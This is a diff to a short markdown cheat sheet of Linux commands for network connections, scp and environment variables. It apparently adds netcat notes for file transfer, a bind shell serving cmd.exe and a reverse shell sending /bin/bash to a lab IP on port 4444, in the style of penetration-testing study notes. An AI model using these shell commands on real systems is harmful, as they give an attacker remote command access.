@@ -1,8 +1,8 @@
-### show connections
+### Show network connections
 netstat -natup  
 ss -natup
 
-### copy file from remote machine to local tmp
+### Copy file from remote machine to local tmp
 scp john@localhost:/var/tmp/CopyMe.txt /tmp  
 scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
 
@@ -11,3 +11,21 @@ echo $SHELL
 
 ### echo environmental variable
 env
+
+### NC transfering files
+```
+nc -lvnp 6666 > incoming.txt
+nc -nv 192.168.65.61 6666 < incoming.txt
+```
+
+### NC bind shell
+```
+nc -nlvp 4444 -e cmd.exe
+nc -nv 10.11.0.22 4444
+```
+
+### NC reverse shell
+```
+nc -nlvp 4444
+nc -nv 10.11.0.22 4444 -e /bin/bash
+```
